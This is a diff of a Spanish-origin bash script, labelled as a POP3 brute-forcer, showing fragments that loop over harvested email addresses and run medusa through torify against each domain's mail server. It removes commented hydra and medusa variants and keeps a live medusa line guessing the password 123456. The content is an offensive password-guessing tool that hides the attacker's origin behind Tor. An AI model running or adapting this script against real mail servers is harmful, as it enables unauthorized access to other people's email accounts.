@@ -1,7 +1,7 @@
 #!/bin/bash
 #http://www.bash.com.ar
 #Script to bruteforce POP3
-#
+
 USER_ACCOUNTS="direcciones_validas.txt"
 DEFAULT_PASSWORDS="passwords.txt"
 LOG="medusa.log"
@@ -39,9 +39,6 @@ while [ 1 ]; do
             echo $user >>$TEMPORAL_PASSWORDS
             echo $domain_only >>$TEMPORAL_PASSWORDS
             
-            #hydra command line
-            # hydra -w 5 -e n -t 2 -l $i -P $TEMPORAL_PASSWORDS smtp://$domain -vV
-            #torify medusa -h $domain -u $i -P $TEMPORAL_PASSWORDS -O $LOG -e n -M pop3
             torify medusa -h $domain -u $i -p 123456 -O $LOG -M pop3 -b
             #SUCCESS
             
